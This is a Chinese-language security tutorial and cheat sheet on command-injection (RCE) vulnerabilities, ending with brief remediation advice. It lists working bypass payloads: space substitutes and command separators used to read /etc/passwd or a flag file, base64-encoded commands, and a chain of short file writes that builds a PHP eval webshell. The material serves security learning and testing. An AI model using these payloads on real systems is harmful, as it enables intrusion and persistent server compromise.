# RCE

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**描述**

由于业务需求，程序有可能要执行系统命令的功能，但如果执行的命令用户可控，业务上有没有做好限制，就可能出现命令执行漏洞。

**相关工具**
- [commixproject/commix](https://github.com/commixproject/commix)

**相关案例**
- [静态站点托管平台仅能托管静态资源？](https://tttang.com/archive/1501/)
- [The Cloudflare Bug Bounty program and Cloudflare Pages](https://blog.cloudflare.com/pages-bug-bounty/)
    - [Cloudflare Pages, part 1: The fellowship of the secret](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt1/)
    - [Cloudflare Pages, part 2: The two privescs](https://blog.assetnote.io/2022/05/06/cloudflare-pages-pt2/)

**writeup**
- [BUUCTF--[第二章 web进阶]死亡ping命令](https://blog.csdn.net/qq_45414878/article/details/109672659)

---

## 绕过技巧

### 空格代替

空格在 bash 下，可以用以下字符代替空格
```
<
${IFS}
$IFS$9
%09
```

```
cat</etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
cat%09/etc/passwd
```

$IFS 在 linux 下表示分隔符，只有 cat$IFSa.txt 的时候, bash 解释器会把整个 IFSa 当做变量名，所以导致没有办法运行，然而如果加一个 {} 就固定了变量名，同理在后面加个 $ 可以起到截断的作用，而 $9 指的是当前系统 shell 进程的第九个参数的持有者，就是一个空字符串，因此 $9 相当于没有加东西，等于做了一个前后隔离。

### 截断符号

比如测试 ping 功能的点，要求填写一个 ip 参数这样的题目，这个时候就需要测试截断符号，将你输入的 ip 参数和后面要执行的命令隔开。首先测试所有的截断符号：
```
$
;
|
-
(
)
`
||
&&
&
}
{
%0a
```

利用截断符号配合普通命令简单问题基本就出来；例如：ip=127.0.0.1;cat /home/flag.txt 这样就可以达到同时执行两条命令的效果

### 编码

这种绕过针对的是系统过滤敏感字符的时候，比如他过滤了cat命令，那么就可以用下面这种方式将cat先base64编码后再进行解码运行。
```
echo 'cat' | base64

`echo 'Y2F0Cg==' | base64 -d` /etc/passwd
```

针对一些代码执行的场景,可以通过在 base64 中添加干扰字符的方式尝试绕过
```
success-inject
c3VjY2Vzcy1pbmplY3Q=
```

php
```php
<?php
$str='--!~@--c3V$$j<$>Y--|@--2Vzcy1--|@--p--|@--b^^mp--|@--lY--|@--3Q=';
echo base64_decode($str);
?>
```

python
```python
import base64
leleyyds = base64.b64decode("--!~@--c3V$$j<$>Y--|@--2Vzcy1--|@--p--|@--b^^mp--|@--lY--|@--3Q=")
print(leleyyds.decode())
```

### 单引号

```
cat /etc/pass'w'd
```

### 反斜杠利用

linux 下创建文件的命令可以用 `1>1` 创建文件名为 1 的空文件

`ls>1` 可以直接把 ls 的内容导入一个文件中, 但是会默认追加 \n

**Linux**
```
w>hp\\
w>c.p\\
w>d\>\\
w>\ -\\
w>e64\\
w>bas\\
w>7\|\\
w>XSk\\
w>Fsx\\
w>dFV\\
w>kX0\\
w>bCg\\
w>XZh\\
w>AgZ\\
w>waH\\
w>PD9\\
w>o\ \\
w>ech\\
ls -t>ls
sh ls
```

- w 长度最短的命令
- ls -t 以创建时间来列出当前目录下所有文件
- 文件列表以[ [ 换 行符] ]分割每个文件
- 引入 `\` 转义ls时的换行
- 换行不影响命令执行
- 成功构造任意命令执行,写入Webshell

```bash
ls -t
echo PD9waHAgZXZhbCgkX0dFVFsxXSk7 | base64 -d>c.php
```

### Fuzz字典

- [RCE字典](https://github.com/ffffffff0x/AboutSecurity/tree/master/Payload/RCE)

---

## 修复方案

* 避免命令用户可控
* 如需用户输入参数，则对用户输入做严格校验，如&&、|、;等
